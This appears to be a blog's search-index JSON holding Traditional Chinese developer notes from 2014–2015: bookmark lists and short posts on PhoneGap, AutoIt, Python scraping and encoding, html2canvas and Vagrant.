http://love67.net/2014/02/09/python-sord-combine/ [pyquery] 抓網頁資料的神器 http://kynix.logdown.com/posts/194930-pyquery-get-web-data-artifact pyquery: 基於python和jquery語法操作XML http://www.geoinformatics.cn/lab/pyquery/ phpquery http://program.faryne.tw/2012/01/phpquery.html lmxl http://www.zhidaow.com/post/html-scraping Scrapy scrapy.org ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:4:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"2015/06 【程式】jQuery : 取得和設定 radio, checkbox, select 的值 (轉) http://blog.xuite.net/chingwei/blog/22969215-%E3%80%90%E7%A8%8B%E5%BC%8F%E3%80%91jQuery+%3A+%E5%8F%96%E5%BE%97%E5%92%8C%E8%A8%AD%E5%AE%9A+radio,+checkbox,+select+%E7%9A%84%E5%80%BC+%28%E8%BD%89%29 dbv.php http://dbv.vizuina.com/ Phinx https://phinx.org/ Javascript 陣列vs物件 http://guang.logdown.com/posts/278890-javascript-array-vs-object lambda 運算式 http://openhome.cc/Gossip/Python/LambdaExpression.html PyUserInput https://github.com/SavinaRoja/PyUserInput 中文亂碼 https://www.facebook.com/groups/pythontw/permalink/10154059772548438/ http://blog.longwin.com.tw/2014/09/python-list-print-chinese-2014/ JQ | stop http://erhshe-blog.logdown.com/posts/278957-jq-stopcallback HTML5 Attributes :placeholder 、multiple 、formtarget 、formmethod 、formaction 、autofocus http://chc-blog.logdown.com/posts/278946-full-browser-support-property Shell Script學習小記錄 http://jayden.logdown.com/posts/190019-small-shell-script-learning-record Got Your PW(專供資安人的資源與工具整理) https://gotyour.pw/index.html Understanding Python Decorators in 12 Easy Steps! http://simeonfranklin.com/blog/2012/jul/1/python-decorators-in-12-steps/ tutorialzine http://tutorialzine.com/ [Android] volley，好用的http client library http://huli.logdown.com/posts/280423-android-volley-useful-network-related-library (原創) 為什麼C#、Java需要提供interface? (C/C++) (.NET) (C#) (Java) http://www.cnblogs.com/oomusou/archive/2007/03/17/677832.html tabulate https://pypi.python.org/pypi/tabulate 玩轉 CSS 3D - 原理篇 - OXXO.STUDIO http://www.oxxostudio.tw/articles/201506/css-3d.html Hello Backbone.js http://arturadib.com/hello-backbonejs/ Python \u0026 R, for scientists https://www.getdatajoy.com/ Top 10 Programming Fonts http://hivelogic.com/articles/top-10-programming-fonts Python Note - *args, **kwargs http://et10man-blog.logdown.com/posts/281264-python-args-kwargs Python string formatting: % vs. .format stackoverflow.com/questions/5082452/python-string-formatting-vs-format [Python] 內建函式filter, map, reduce http://www.dotblogs.com.tw/law1009/archive/2013/07/09/109217.aspx ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:5:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"2015/07 .bash_profile 與 .bashrc 的差異 http://jamestw.logdown.com/posts/283485--bash-profile-bashrc-difference All about Flask, the Python micro web framework inc. extensions \u0026 tutorials https://flask.zeef.com/stefane.fermigier JavaScript 标准参考教程（alpha） http://javascript.ruanyifeng.com/advanced/backbonejs.html material design principle https://medium.com/google-developers/introducing-material-design-lite-3ce67098c031 http://getmdl.io/ A Simple Example – Backbone.js Tutorial Part 1 – Collection based on JSON + View http://blog.joelberghoff.com/2012/07/22/backbone-js-tutorial-part-1/ [筆記] JavaScript 變數宣告與作用域 http://kuro.tw/posts/2015/07/08/note-javascript-variables-declared-with-the-scope-scope [JS][JQ]網頁Typing特效 http://crazy-nerd.logdown.com/posts/284971-js-jq-typing-a-web-page-special-effects pancakes https://pancake.io/ Apache2 /etc/hosts.deny ignored in Ubuntu 14.04 http://serverfault.com/questions/619714/etc-hosts-deny-ignored-in-ubuntu-14-04 CLNDR.js ~ A jQuery Calendar Plugin http://kylestetz.github.io/CLNDR/ 純CSS 以偽元素作照片說明遮罩 http://www.mickey8509.com/2015/07/css_22.html How to Center in CSS http://howtocenterincss.com/ JQuery 超簡單視差滾動 http://www.mickey8509.com/2015/07/jquery.html Simple Block, Simple Inline. http://limouren.blogspot.tw/2005/08/simplier-block.html http://limouren.blogspot.tw/2005/08/simple-block-simple-inline.html margin負值 http://www.w3cplus.com/css/the-definitive-guide-to-using-negative-margins.html 如何正確實作出固定寬度且置中的版型 http://jaceju.net/2005/04/16/9/ http://pinkyvivi.pixnet.net/blog/post/1131260-css%E2%88%A5%E6%8E%92%E7%89%88%E8%A7%80%E5%BF%B5-boxmodel%3Emargin%E3%80%81padding PHP高效率寫法（詳解原因） http://blog.csdn.net/hguisu/article/details/7369827 Wappalyzer - 查詢網站有用到什麼系統、框架… https://wappalyzer.com/download ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:6:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"2015/08 –SEO 有關Web特殊符號 https://www.facebook.com/groups/f2e.tw/permalink/868322123205154/ 避免常見的六種 HTML5 錯誤用法 http://waterlily-lsl.com/modules/article/view.article.php/c1/258 今天還有哪些 SEO 問題？（20140825） http://blog.seo-tw.org/2011/04/seo-step-by-step.html https://support.google.com/webmasters/answer/79812?hl=zh-Hant SEO–END ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:7:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"都不知堆了多久(書籤堆積的內容該整理整理) 樹莓派Raspberry Pi@台灣　非官方作業系統鏡像站(Mirror) http://ftp.yzu.edu.tw/linux/raspberrypi/ 爬蟲教學 http://www.largitdata.com/course_list/ https協定說明 https://speakerdeck.com/dannvix/https-works ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:8:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"Linux 同部備份 透過rsync備份 http://blog.davidou.org/archives/774 SSH + Rsync的備份機制 http://kawsing.blogspot.tw/2011/05/ssh-rsync.html adobe 配色 https://color.adobe.com/zh/explore/newest/ Hyperlapse.js － 利用 Google 街景製作動態縮時效果 http://blog.infographics.tw/2015/09/hyperlapse-js/ php中__call(),__get(),__set(),__construct(),__isset()等一些总结 http://blog.51yip.com/php/947.html Null vs. False vs. 0 in PHP http://stackoverflow.com/questions/137487/null-vs-false-vs-0-in-php Python http://marco79423.twbbs.org/articles/category/python/ Java设计模式（12）迭代模式（Iterator模式） http://www.cnblogs.com/Coda/p/4298454.html 如何透過PHP、SOAP 及 WSDL撰寫Web Service https://ascc.sinica.edu.tw/iascc/articals.php?_section=2.4\u0026_op=?articalID:7073 Android如何使用GET, POST取得資料 http://blog.tonycube.com/2011/11/androidget-post.html [PHP]這樣寫測試錯了嗎？ http://jaceju.net/2015/10/14/what-is-test/ http://mypaper.pchome.com.tw/zerojudge/post/1327159981 websphere http://big5.stcsm.gov.cn/gate/big5/www.stcsm.gov.cn/learning/lesson/xinxi/20020617/20020617.htm 《JSP 2.0 動態網頁入門實務：Web應用程式/資料庫應用/JNDI/JavaMail/XML/AJAX/自訂標籤/JSTL/EL/MVC》筆記 http://w1a2d3s4q5e6.blogspot.tw/2012/10/jsp-20-webjndijavamailxmlajaxjstlelmvc.html DesignPatternsPHP http://designpatternsphp.readthedocs.io/en/latest/ css filters http://designpatternsphp.readthedocs.io/en/latest/ java 數字轉字串 字串轉數字 http://hank20.blogspot.tw/2012/05/java.html Java构造和解析Json数据的两种方法详解二 http://www.cnblogs.com/lanxuezaipiao/archive/2013/05/24/3096437.html KKBOX iOS/Mac OS X 基本開發教材 https://www.gitbook.com/book/zonble/kkbox-ios-dev/details 資料視覺化 http://blog.infographics.tw/ 語言技術：Jav語言技術：Java Essencea Essence http://openhome.cc/Gossip/JavaEssence/index.ht00 Java transient关键字使用小记 http://www.cnblogs.com/lanxuezaipiao/p/3369962.html What PHP based git web interface can be recommended ?https://ma.juii.net/blog/git-web-interface 網站利用 Facebook 帳號登入 (使用 OAuth) http://sweeteason.pixnet.net/blog/post/40581580#start 如何正確的使用 Runtime.exec() http://yindingtsai.blogspot.tw/2010/01/runtimeexec.html http://mei.homin.com.tw/circularNavPrototype-min.html 筆記-CSS選擇器的套用優先順序 http://blog.darkthread.net/post-2011-06-08-css-specificity.aspx 经网友提醒，才发现 new Date(‘2015-12-31’) 和 new Date(‘2015/12/31’) 是不一样的 https://twitter.com/ruanyf/status/666266182505267200 Oracle SQL 結合型的子查詢 sub Query http://pclevin.blogspot.tw/search/label/Oracle%20SQL?updated-max=2014-05-25T18:22:00%2B08:00\u0026max-results=20\u0026start=20\u0026by-date=false MySQL 超新手入門（1）重新開始 http://www.codedata.com.tw/database/mysql-tutorial-getting-started 子查詢 Select範例 https://gradyli.wordpress.com/2008/12/02/%E5%AD%90%E6%9F%A5%E8%A9%A2-select%E7%AF%84%E4%BE%8B/ ","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:9:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["網站記錄"],"content":"matishsiao/phonegap-tutorial https://github.com/matishsiao/phonegap-tutorial Copy to Clipboard in pure javascript - Coder Example https://coderexample.com/copy-to-clipboard-in-pure-javascript/ Vue.js 台灣 https://www.facebook.com/groups/vuejs.tw/permalink/1087045058041892/ Front-End Developers Taiwan https://www.facebook.com/groups/f2e.tw/permalink/1051952364842128/ CSS only scroll indicator http://codepen.io/MadeByMike/details/ZOrEmr MKSB(en): Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212) http://mksben.l0.cm/2016/07/xxn-caret.html 下载量最高的 100 个 Laravel 扩展包推荐_PHPHub_中国最靠谱的_PHP_和_Laravel_开发者社区 https://phphub.org/topics/2530 gitignore.io - Create Useful .gitignore Files For Your Project https://www.gitignore.io/ 用 JavaScript 學習資料結構和演算法：堆疊（Stack）篇 | TechBridge 技術共筆部落格 http://blog.techbridge.cc/2016/06/24/javascript-data-structure-algorithm-stack/ webdriver.io - 前端測試入門筆記… « tedshd’s DevNote http://blog.tedshd.io/posts/774036-webdriverio-introduction-to-front-end-test-notes PJCHENder網頁前端資源站 https://www.facebook.com/pjchender/photos/?tab=album\u0026album_id=1078492305569538 How to run accessibility testing demos – Shopify UX – Medium https://medium.com/shopify-ux/how-to-run-accessibility-testing-demos-602005e176d0 一頭栽入 Vue.js TDD 的世界 - Google 簡報 https://docs.google.com/presentation/d/1YxsUucBZNlN-YLjDNoF8-Wk0h-sG4nAqw9eT4Y2OGMo/edit#slide=id.p Vuediner #2 - Ping Pong ! Vuex + Laravel by 鄭宇翔 - YouTube https://www.youtube.com/watch?v=C1aLFTs6QM8 Green Man Is Walking http://codepen.io/jsgao0/details/AXgwZN Front-End Developers Taiwan https://www.facebook.com/groups/f2e.tw/permalink/1040322676005097/ Python Taiwan https://www.facebook.com/groups/pythontw/permalink/10155214580238438/ jQuery Ajax API 實作以及 Template 介紹 « MUKI space* http://muki.tw/tech/jquery-ajax-crud-and-template/ Rdatasets http://vincentarelbundock.github.io/Rdatasets/ Cleave.js - Format input text content when you are typing http://nosir.github.io/cleave.js/ ES6 你可能不知道的事 - 基础篇 | Taobao FED | 淘宝前端团队 http://taobaofed.org/blog/2016/07/22/es6-basics/index.html Map Fiddle http://mapfiddle.org/ gjccing/c3s: use css selector to select js object content. https://github.com/gjccing/c3s Laradiner 讀書會 - SOLID 原則談 DIP 依頼反轉原則 by 閃亮亮 - YouTube https://www.youtube.com/watch?v=k3uERr0P9iE PHP 台灣 https://www.facebook.com/groups/199493136812961/permalink/1032002790228654/ [JavaScript] 幾個實用的 JS 小技巧 · Larry http://larry850806.github.io/2016/07/16/JS-tips/ Google 我不是機器人 reCAPTCHA Ajax 驗證碼教學範例 for PHP | MIS腳印 http://www.smalljacky.com/programming-language/php/google-recaptcha-ajax-for-php/ 網站 icon 生成器，一鍵通殺全平台。 - 踢踢五 http://tt5.org/%e7%b6%b2%e7%ab%99-icon-%e7%94%9f%e6%88%90%e5%99%a8%ef%bc%8c%e4%b8%80%e9%8d%b5%e9%80%9a%e6%ae%ba%e5%85%a8%e5%b9%b3%e5%8f%b0/ dylandy/tobopomo.js: A simple and easy plugin for convert string to Bopomo script and Chinese Characters. https://github.com/dylandy/tobopomo.js 淺入淺出 eslint 與實作 · De-bug: 一鍵跑版 http://abalone0204.github.io/2016/07/11/eslint-fxcking-setup/ 開發網站時，寫測試的3個簡單方法 | 轉個彎日誌 http://blog.turn.tw/?p=3250 emoji-picker Demo http://onesignal.github.io/emoji-picker/ CSS for Decoration http://razvancaliman.com/css-for-decoration/#/ Front-End Developers Taiwan https://www.facebook.com/groups/f2e.tw/permalink/1021845897852775/ Vuedinner #1 第一次用 Vue.js 就愛上 by Kuro - YouTube https://www.youtube.com/watch?v=jXdZlbH_ut8 [教學] 寫給會在部落格中撰寫程式碼的你 ─ 在網頁中嵌入高亮程式碼上色 (syntax highlighting) | PJCHENder愛分享 https://pjchender.blogspot.tw/2016/06/prism-syntax-highlighting.html CSS \u0026 HTML - 純CSS點擊下拉式選單 - Twincl https://tw.twincl.com/css-html/*6630 A-Frame – Building Blocks for the VR Web https://aframe.io/ l3vRj14XAQFWBi3hm.gif（GIF 圖片，962x416 像素） http://i.giphy.com/l3vRj14XAQFWBi3hm.gif 網站前端測試實做手冊 by caesarchi [Leanpub PDF/iPad/Kindle] https://leanpub.com/frontend_e2e_test_guidebook css - Which is better, #fff or #FFF? - Stack Overflow http://stackoverflow.com/questions/3733172/which-is-better-fff-or-fff An Overview of HTML5 Semantics by Michelle Lee on CodePen http://codepen.io/mi-lee","date":"2015-01-05","objectID":"/blog/posts/logdown/2015-01-05-2015-random-notes/:10:0","tags":null,"title":"2015 隨意筆記紀錄","uri":"/blog/posts/logdown/2015-01-05-2015-random-notes/"},{"categories":["Git"],"content":"https://github.com/crilleengvall/gitignore/blob/master/Phonegap.gitignore https://github.com/crilleengvall/gitignore gitignore.io - Create Useful .gitignore Files For Your Project 參考來源： .gitignore for PhoneGap/Cordova 3.0 projects - what should I commit? http://stackoverflow.com/questions/17911204/gitignore-for-phonegap-cordova-3-0-projects-what-should-i-commit ","date":"2014-12-29","objectID":"/blog/posts/logdown/2014-12-29-program-projects-using-git-gitignore-set/:0:0","tags":["git","gitignore"],"title":"程式專案使用git的.gitignore設定","uri":"/blog/posts/logdown/2014-12-29-program-projects-using-git-gitignore-set/"},{"categories":["網站記錄"],"content":"參考來源： Gulp, Grunt, Bower以及npm http://blog.darkthread.net/post-2014-09-25-gulp-grunt-bower-npm.aspx Bower 前端套件管理工具 http://edentsai231.logdown.com/posts/198741-bower-front-end-kit-management-tool Day 1: Bower —— 管理你的客戶端依賴關係 http://segmentfault.com/a/1190000000349555 ","date":"2014-12-24","objectID":"/blog/posts/logdown/2014-12-24-bower-front-end-package-management-tool/:0:0","tags":null,"title":"Bower前端套件管理工具","uri":"/blog/posts/logdown/2014-12-24-bower-front-end-package-management-tool/"},{"categories":["CSS"],"content":" transition: property duration timing-function delay|initial|inherit; http://www.w3schools.com/cssref/css3_pr_transition.asp http://www.wibibi.com/info.php?tid=CSS3_transition_%E5%B1%AC%E6%80%A7 ","date":"2014-12-23","objectID":"/blog/posts/logdown/2014-12-23-css3transition-transition-effects/:0:0","tags":["CSS","transition"],"title":"[CSS3]transition的轉場效果","uri":"/blog/posts/logdown/2014-12-23-css3transition-transition-effects/"},{"categories":["AutoIt"],"content":"由於最近多了一項收發文工作，每天都要開起電腦收發文程式。 我就想想有沒有讓程式自動化，這樣我以後就開機就好了XD 於是我就開始做了 目前我只知道有這些 Sikuli Script 按鍵精靈 Autoit 這三個我只用過Sikuli，當出使用Sikuli的原因是因為對Python有好感 而且用圖來判斷有很炫的感覺XD，但後來他慢慢升級在Windows上會有怪問題，所以這次也不考慮用它。 Autoit在以前SuperXP、AutoXP，那個時代還滿有名的自動安裝軟體。 而且那一台電腦是Windows 8，查了一下Autoit在Win 8(desktop mode)可以正常運行，又能轉exe，所以就決定用它 以前不太會寫程式，教學文件幾乎都是英文的(英文苦手:X) 現在有基本程式基礎，所以比較看的懂教學文件，不過我依然還是英文苦手orz SciTE Script Editor，還滿好用了 隨便輸入幾個關鍵字就會跑出選單 目前有用幾個相關指令 Run WinWaitAct ControlClick ControlSend 這4個函式就能滿足我的需求 編寫時用AutoIt Window Info拉Finder Tool出來到按鈕 在Control下方的Advanced Mode可抓出CLASS名稱和INSTANCE ControlClick(\"程式標題名稱\",\"程式按鈕文字\",[CLASS:Button; INSTANCE:2]) 大部份函式都機乎是這樣 最後發現執行有動到滑鼠鍵盤可能會失效 爬文找到一個方法可以鎖住鍵盤滑鼠 BlockInput(1);鎖定鍵盤滑鼠 BlockInput(0);解除鎖定鍵盤滑鼠 程式寫錯假如你有BlockInput(1)不能做動作的話 別急著按電腦重開機，只要Crontol+Alt+Del兩次 就可以解除鎖定了 參考： 自動安裝程式 - 試試AutoIt http://blog.roodo.com/sherwin/archives/71806.html AutoIt 【參考資料2009/09/28】 http://id8051.pixnet.net/blog/post/29407939-autoit-%E3%80%90%E5%8F%83%E8%80%83%E8%B3%87%E6%96%992009-09-28%E3%80%91 請問如何禁用滑鼠?[已解決] http://www.autoitx.com/viewthread.php?tid=13953 http://www.autoitx.com/index.php 發現好東西 autoit http://crazy.molerat.net/learner/cpuroom/net/reading.php?filename=100100995837.dov 桌面離線也可動作的AutoIt指令：ControlSend跟ControlClick http://pulipuli.blogspot.tw/2011/05/autoitcontrolsendcontrolclick.html [A] AutoIt!! 註解與其它注意事項 http://edisonx.pixnet.net/blog/post/38335545-%5Ba%5D-autoit!!-%E8%A8%BB%E8%A7%A3%E8%88%87%E5%85%B6%E5%AE%83%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85 2020-09-11 Window info AutoIT 自動化完成程式安裝 @ JosephPhoto 的 網路日誌我的網誌 :: 隨意窩 Xuite日誌 管理者模式 Keyword #RequireAdmin Run as administrator ? - AutoIt General Help and Support - AutoIt Forums Autoit 使用 runas 執行沒有反應 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 放大縮小 AutoIT: WinSetState可以定义窗口大小 - chenpassion - 博客园 其他 J2TEAM/awesome-AutoIt: A curated list of awesome UDFs, example scripts, tools and useful resources for AutoIt. FileInstall 編譯 exe 奔騰兔分享誌: AutoIt 執行外部程式進階應用 通知 Function TrayTip filedelete 跟暫存路徑 Function FileDelete Function _WinAPI_GetTempFileName 程式是否開啟 Function ProcessExists terminate process? - AutoIt General Help and Support - AutoIt Forums ","date":"2014-12-20","objectID":"/blog/posts/logdown/2014-12-20-autoit-notes/:0:0","tags":["AutoIt","自動化"],"title":"Autoit筆記","uri":"/blog/posts/logdown/2014-12-20-autoit-notes/"},{"categories":["Phonegap"],"content":"首先套件可到http://plugins.cordova.io/搜尋 http://plugins.cordova.io/#/package/org.apache.cordova.battery-status CMD指令輸入 phonegap plugin add org.apache.cordova.battery-status 我把cordova換成phonegap 官網教學是用plugman來裝 但這兩種安裝方法好像有差(我還沒搞清楚= =|||) 然後，試試battery-status程式竟然沒有跑出電池資訊 window.addEventListener(\"batterystatus\", onBatteryStatus, false); function onBatteryStatus(info) { // Handle the online event alert(\"Level: \" + info.level + \" isPlugged: \" + info.isPlugged); } 後來查到幾個原因 1.加入cordova.js (我沒加入那個orz) \u003cscript type=\"text/javascript\" src=\"cordova.js\"\u003e\u003c/script\u003e 2.battery-status擺放位置需在deviceready事件處理 document.addEventListener(\"deviceready\", onDeviceReady, false); function onDeviceReady() { window.addEventListener(\"batterystatus\", onBatteryStatus, false); } function onBatteryStatus(event) { console.log(\"電量: \" + event.level + \"插入充電器: \" + event.isPlugged); } 用手機開Phonegap developer app進去就可以看到成果:D – 參考資料： phonegap 增加media plugin範例 http://pcschoolleo.blogspot.tw/2013/11/phonegap-media-plugin.html http://iclab.csie.chu.edu.tw/course/app-programming/lecture/phonegap-jquery-mobile/ PPT第12章 PhoneGap框架主要是由手機平台的原生程式碼和JavaScript程式碼所組成，Android就是cordova-x.x.x.jar和cordova-x.x.x.js檔案，所以，框架載入分成原生和JavaScript兩部分。 事件只有window.onload、deviceready、resume和pause事件是我們可以處理的事件，其他都是內部事件。 PhoneGap 與 Cordova 的實際差異 http://blog.tiger-workshop.com/difference-between-phonegap-and-cordova/ PhoneGap API中文幫助文檔——Events（事件） http://fanli7.net/a/JAVAbiancheng/JAVAzonghe/20120706/181894.html Plugreg http://plugreg.com/ ","date":"2014-12-16","objectID":"/blog/posts/logdown/2014-12-16-phonegap-mounting-kit-battery-status/:0:0","tags":null,"title":"[phonegap]安裝套件-battery-status","uri":"/blog/posts/logdown/2014-12-16-phonegap-mounting-kit-battery-status/"},{"categories":["Phonegap"],"content":"因為phonegap build android顯示需要Android SDK 19，但是卻出現這個訊息。 The SDK Build Tools revision (19.0.3) is too low for project 'Testing'. Minimum required is 19.1.0 開起SDK Manager.exe選擇Tool資料夾裡面的Android SDK Build-tools (Rev)19.1 就解決此問題 ","date":"2014-12-15","objectID":"/blog/posts/logdown/2014-12-15-phonegap-apk-compilation-error-messages/:0:0","tags":null,"title":"Phonegap 編譯APK錯誤訊息","uri":"/blog/posts/logdown/2014-12-15-phonegap-apk-compilation-error-messages/"},{"categories":["Phonegap"],"content":"先下載NodeJS安裝 原因官網建議是利用npm管理套件來安裝 C:\\\u003e npm install -g phonegap 相關Android安裝環境這邊 有詳細記錄 可在Android安裝Phonegap Developer app http://app.phonegap.com/ phonegap create my-app cd my-app phonegap serve 能簡單執行程式!!! 參考來原： http://www.dotblogs.com.tw/maplenote/archive/2014/01/16/phonegap_android_install.aspx ","date":"2014-12-08","objectID":"/blog/posts/logdown/2014-12-08-phonegap-installation-notes/:0:0","tags":null,"title":"phonegap安裝環境筆記","uri":"/blog/posts/logdown/2014-12-08-phonegap-installation-notes/"},{"categories":["Python"],"content":"實作異常的順力^^ import base64 fp = open(\"a.jpg\",\"rb\") img = fp.read() fp.close() print(base64.b64encode(img)) 在接下來使用requests來實作 imgdata = requests.get(imgurl).content imgb64 = base64.b64encode(imgdata) 完成:D ","date":"2014-11-20","objectID":"/blog/posts/logdown/2014-11-20-python-picture-converted-to-base64-code/:0:0","tags":null,"title":"[Python]圖片轉成base64碼","uri":"/blog/posts/logdown/2014-11-20-python-picture-converted-to-base64-code/"},{"categories":["Python"],"content":"由於用網頁爬蟲抓取的資料存入json 文件都會顯示\"{artist\": \"\\u3058\\u3093\"} 但程式抓取都不會有亂碼的問題 但今天我Google大神一個整天 終於找到方法 str.encode().decode('unicode_escape') 儲存文件時請記得調成utf-8 fp = open(\"animeList.json\",\"w+\", encoding = \"utf-8\") 內文的\\n,\\r,\\t…等等都會不見 最終以str.replace('\\n','\\\\n')來解決 repr包字串會跑出\\x5e東西 參考： http://stackoverflow.com/questions/24787224/how-to-convert-a-python-string http://www.haogongju.net/art/2041510 http://elleryq-blog.logdown.com/posts/197801/python3-u860bu679c-into-a-unicode-string ","date":"2014-11-19","objectID":"/blog/posts/logdown/2014-11-19-python-files-store-unicode-codes-problem/:0:0","tags":null,"title":"[Python]文件儲存unicode碼的問題","uri":"/blog/posts/logdown/2014-11-19-python-files-store-unicode-codes-problem/"},{"categories":["Python"],"content":"上次參加COSCUP 2014時候，電腦不只會幫你選土豆，還會幫你選新聞 最近無聊做個小實驗 使用requests、BeautifulSoup實作抓資料存成json 結果發現不會太難 from selenium import webdriver from bs4 import BeautifulSoup import requests import re import json #browser = webdriver.Firefox() #browser.get(\"/* url */\") #html_source = browser.page_source soup = BeautifulSoup(requests.get(\"/* url */\").text) fp = open(\"/* you can not know it o.\u003c */\",\"w+\") fp.write(json.dumps(b)) fp.close() selenium通常是用來程式測試上面 但也可以抓取網頁HTML 通常用爬蟲requests和beautifulsoup就夠方便了XD ","date":"2014-11-18","objectID":"/blog/posts/logdown/2014-11-18-python-using-beautifulsoup-and-requests-when-crawler/:0:0","tags":["爬蟲","requests","BeautifulSoup"],"title":"[Python]使用requests、BeautifulSoup當網頁爬蟲","uri":"/blog/posts/logdown/2014-11-18-python-using-beautifulsoup-and-requests-when-crawler/"},{"categories":["HTML"],"content":"最近使用html2canvas圖片都無法順利呈現… 最終在https://github.com/niklasvh/html2canvas/issues/288找到解決問題。 https://github.com/niklasvh/html2canvas/commit/e9afe0396019abc39bdb949d78819ae971bf5f2c 不過使用background-size: xxpx;數值仍然在Firefox上還是有問題 但是background-size:cover和background-size:contain可以順力產生圖片 ","date":"2014-11-12","objectID":"/blog/posts/logdown/2014-11-12-htmnl2canvas-on-firefox-background-size-black-screen-problem/:0:0","tags":["html2canvas","background-size"],"title":"html2canvas在Firefox上background-size黑畫面的問題","uri":"/blog/posts/logdown/2014-11-12-htmnl2canvas-on-firefox-background-size-black-screen-problem/"},{"categories":["網站記錄"],"content":"看到還在用Google翻譯？6個超強網站讓你查到最道地的英文介紹覺得還不錯，記錄一下 Google Netspeak Just the word TANGO Verb Noun Collocation (部分中、英對照) VoiceTube The Corpus of Contemporary American English (COCA) 14個APP好像也不錯低頭族必備！英文想變好，快裝這14個實用英文學習App ","date":"2014-10-29","objectID":"/blog/posts/logdown/2014-10-29-6-super-increase-english-website/:0:0","tags":null,"title":"6個超強增加英文能力網站","uri":"/blog/posts/logdown/2014-10-29-6-super-increase-english-website/"},{"categories":["HTML"],"content":"路過以html2canvas制作頁面截圖列印教學 覺得還不錯，筆記筆記！ 以html2canvas制作頁面截圖列印 網上有很多截圖的Service, 如webkit2png或khtml2png，但始終也要經過第三方處理，對於一些內部應用好像不太方便。 HTML2CANVAS是完全以Client Side Javascript 來將網頁截圖，由於需要用到HTML5的CANVAS ELEMENT，所以對瀏覽器有一定要求，例如 IE9以下並不支援 (但不知道如果用EXCANVAS可否彌補瀏覽器支援上的不足，稍後再試吧)。 HTML2CANVAS 官方：http://html2canvas.hertzen.com/ 下載：https://github.com/niklasvh/html2canvas 開始編寫時在官方下載了0.34版本，使用時發現 IE9可正常運行，但Chrome只能於ready時執行，而無法由button click event執行。後來改用了0.4版本，卻輪到 IE不行。接著發現其中的renderElement function 中有null value的error, 修改後IE終於亦可正常運作了。 紅色為html2canvas.js新增部份 case \"INPUT\": if (/^(text|url|email|submit|button|reset)$/.test(element.type) \u0026\u0026 (element.value || element.placeholder || \"\").length \u003e 0){ renderFormValue(element, bounds, stack); } 亦可下載修改後的html2canvas.js : https://docs.google.com/file/d/0B9ookpf4ArZcMHhqemVkTzBCVlU/edit?usp=sharing 例子: index.html(http://plnkr.co/edit/VR30GO) \u003c!doctype html\u003e \u003chtml\u003e \u003chead\u003e \u003cscript src=\"jquery.js\"\u003e\u003c/script\u003e \u003c!-- version: 1.9.1 --\u003e \u003cscript src=\"html2canvas.js\"\u003e\u003c/script\u003e \u003c!-- version: 0.4.0 modify --\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eExample\u003c/h1\u003e \u003cpre\u003eHTML2CANVAS to new window and print\u003c/pre\u003e \u003cbutton class=\"print\"\u003ePrint\u003c/button\u003e \u003c!-- Button event must after button element, it is not run insert ready() --\u003e \u003cscript\u003e $(\".print\").on(\"click\", function(event) { html2canvas($('body'), { onrendered: function(canvas) { var newWind=window.open('', \"Print\"); \u003c!-- Must use html5 --\u003e newWind.document.write(\"\u003c!doctype html\u003e\u003chtml\u003e\u003cbody\u003e\u003cimg src='\"+canvas.toDataURL()+\"'/\u003e\u003c/body\u003e\u003c/html\u003e\"); newWind.print(); } }); }); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e File Download (include index.html, html2canvas.js, jquery.js): https://docs.google.com/file/d/0B9ookpf4ArZcSlB2OXN4c1pGQ00/edit?usp=sharing ","date":"2014-10-28","objectID":"/blog/posts/logdown/2014-10-28-html2canvas-print-screenshots/:0:0","tags":["html2canvas","js"],"title":"使用html2canvas截圖列印","uri":"/blog/posts/logdown/2014-10-28-html2canvas-print-screenshots/"},{"categories":["Vagrant"],"content":"之前Ezgo11安裝vagrant都用的還滿順的 突然換到XP來用…，就發現麻煩的不少 沒法只能用XP來用 這次發現CHEFsupermarket改版了 連找cookbooks下載地方都找不太到 最後發現在右下角 = =||| Cookbooks網址：https://supermarket.getchef.com/ ","date":"2014-10-27","objectID":"/blog/posts/logdown/2014-10-27-install-in-xp-chef/:0:0","tags":null,"title":"在XP上安裝chef","uri":"/blog/posts/logdown/2014-10-27-install-in-xp-chef/"},{"categories":["Vagrant"],"content":"vagrant box add base http://files.vagrantup.com/lucid32.box This is an indication that the the base virtual image is not configured, usually from forgetting to finish the installation. This image is copied, and modified to produce the desired virtualized environment. It’s easy to fix, by running the following: vagrant box add base http://files.vagrantup.com/lucid32.box It is also possible that you installed the box under a different name (the Vagrant website sometimes refers to lucid32). Instead of downloading a new box, in this case, you can edit Vagrantfile like so, changing the box name to whatever you called it on download: config.vm.box = \"lucid32\" If you don’t know what you called it: vagrant box list http://www.garysieling.com/blog/fixing-the-box-base-could-not-be-found-vagrant 題外話， 由於我這台XP上vagrant upvagrant不能用share folder 找不到解決方法 結果後來發現是我腦殘把key改掉 刪掉vagrant_home(.vagrant資料夾) 就解決了 ","date":"2014-10-26","objectID":"/blog/posts/logdown/2014-10-26-fixing-the-box-base-could-not-be-found-vagrant/:0:0","tags":null,"title":"Fixing “The box ‘base’ could not be found.” 